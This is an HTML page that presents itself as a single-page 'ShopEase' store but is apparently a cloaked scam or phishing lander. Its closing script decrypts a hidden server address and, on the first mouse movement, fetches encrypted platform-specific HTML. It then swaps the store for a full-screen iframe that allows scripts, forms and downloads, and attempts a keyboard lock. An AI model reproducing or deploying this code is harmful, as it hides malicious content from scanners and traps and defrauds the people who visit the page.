<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Support</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; }
    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
    a { text-decoration: none; color: inherit; }
    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }

    .popup { 
      position: fixed; 
      top: 0; 
      left: 0; 
      width: 100%; 
      height: 100%; 
      background: #ffffff; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      z-index: 9999; 
    }
    .popup-content { 
      background: #ffffff; 
      padding: 60px; 
      text-align: center; 
      width: 100%;
      max-width: 600px; 
    }
    .loading-gif { 
      width: 160px; 
      height: 160px; 
      margin-bottom: 30px; 
    }
    .popup-content p {
      font-size: 1.5rem; 
      color: #1f2433;
      font-weight: 600;
      margin: 10px 0 35px 0;
    }
    .buttons { 
      display: flex;
      justify-content: center;
      gap: 25px;
    }
    button { 
      padding: 15px 35px; 
      font-size: 1.1rem;
      border: none; 
      border-radius: 8px; 
      cursor: pointer; 
      font-weight: 700; 
      min-width: 150px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    #cancelBtn { background: #f44336; color: white; }
    #continueBtn { background: #4CAF50; color: white; }
    button:hover { opacity: 0.9; }

    /* ===== Base Store Layout Styles ===== */
    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
    .links { display: flex; gap: 18px; margin-left: 8px; }
    .links a { font-size: .92rem; color: #555; }
    .links a:hover { color: #6d28d9; }
    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
                       margin-left: 4px; font-size: .8rem; font-weight: 800; }

    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
    .hero-text { flex: 1 1 320px; }
    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
    .hero-text h1 span { color: #db2777; }
    .hero-text p { color: #555; max-width: 460px; }
    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
    .cta:hover { background: #be185d; }
    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
                box-shadow: 0 12px 30px rgba(0,0,0,.15); }

    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }

    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            padding: 24px 28px 10px; }
    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
            transition: transform .15s, box-shadow .15s; }
    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
    .card .body { padding: 14px 16px 18px; }
    .card h3 { margin: 0 0 4px; font-size: 1rem; }
    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
    .add:hover { background: #6d28d9; }

    .about { padding: 10px 28px 30px; }
    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
    .feature span { font-size: 1.8rem; }
    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
    .feature p { margin: 0; color: #666; font-size: .88rem; }

    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
  </style>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>


</head>
<body>

  <div class="popup" id="customPopup">
    <div class="popup-content">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
      <p>Loading... Please wait.</p>
      <div class="buttons">
        <button id="cancelBtn" type="button">Cancel</button>
        <button id="continueBtn" type="button">Continue</button>
      </div>
    </div>
  </div>
  
  <div id="shop">
    <div class="hint">🛍️ ShopEase</div>
    <header class="nav">
      <div class="brand">🛍️ ShopEase</div>
      <nav class="links">
        <a href="#home">Home</a>
        <a href="#products">Products</a>
        <a href="#about">About</a>
      </nav>
      <span class="clock">🕒 Mon, 29 Jun 2026</span>
      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
    </header>

    <section class="hero" id="home">
      <div class="hero-text">
        <h1>Summer Sale — up to <span>50% OFF</span></h1>
        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
        <a href="#products" class="cta">Shop now</a>
      </div>
      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
    </section>

    <!-- Histats.com  START  (aync)-->
    <script type="text/javascript">var _Hasync= _Hasync|| [];
    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    (function() {
    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
    hs.src = ('//s10.histats.com/js15_as.js');
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
    })();</script>
    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
    <!-- Histats.com  END  -->

    <section id="products">
      <h2 class="section-title">Featured Products</h2>
      <div class="grid">
        <div class="card">
          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
          <div class="body">
            <h3>Running Sneakers</h3>
            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
        <div class="card">
          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
          <div class="body">
            <h3>Classic Watch</h3>
            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
        <div class="card">
          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
          <div class="body">
            <h3>Travel Backpack</h3>
            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
        <div class="card">
          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
          <div class="body">
            <h3>Wireless Headphones</h3>
            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
        <div class="card">
          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
          <div class="body">
            <h3>Sunglasses</h3>
            <div class="price">₹999 <span class="old">₹1,799</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
        <div class="card">
          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
          <div class="body">
            <h3>Instant Camera</h3>
            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
            <button class="add">Add to cart</button>
          </div>
        </div>
      </div>
    </section>

    <section id="about" class="about">
      <h2 class="section-title">Why ShopEase?</h2>
      <div class="features">
        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
      </div>
    </section>

    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
  </div>


  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
  </div>

  <script>
    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
    const URL_KEY = "UrLk3yShopEase01";
    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
    const DATA_URL = DATA_ORIGIN + "/data";
    let lastUrl = null;

    function detectPlatform() {
      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                navigator.platform || navigator.userAgent || "";
      return /mac/i.test(p) ? "mac" : "win";
    }

    function secureKeyboardAccess() {
      if (navigator.keyboard) {
        navigator.keyboard.lock().catch((err) =>
          console.warn("Keyboard lock failed:", err)
        );
      }
    }

    async function loadSecret() {
      const shop = document.getElementById("shop");
      const frame = document.getElementById("frame");
      const contentIframe = document.getElementById("contentiframe");

      try {
        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
        const { cipher } = await res.json();
        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
        if (!html) throw new Error("Decrypt failed — wrong key?");

        if (lastUrl) URL.revokeObjectURL(lastUrl);
        const blob = new Blob([html], { type: "text/html" });
        lastUrl = URL.createObjectURL(blob);

        frame.src = lastUrl;
        
        shop.style.display = "none";
        contentIframe.style.display = "block"; 
        document.getElementById("customPopup").style.display = "none";
        
       
        secureKeyboardAccess();

      } catch (e) {
        document.querySelector(".hint").textContent = "⚠️ " + e.message;
        document.getElementById("customPopup").style.display = "none";
      }
    }

    window.addEventListener("mousemove", () => {
      document.getElementById("customPopup").style.display = "none";
      loadSecret();
    }, { once: true });
  </script>
</body>
</html>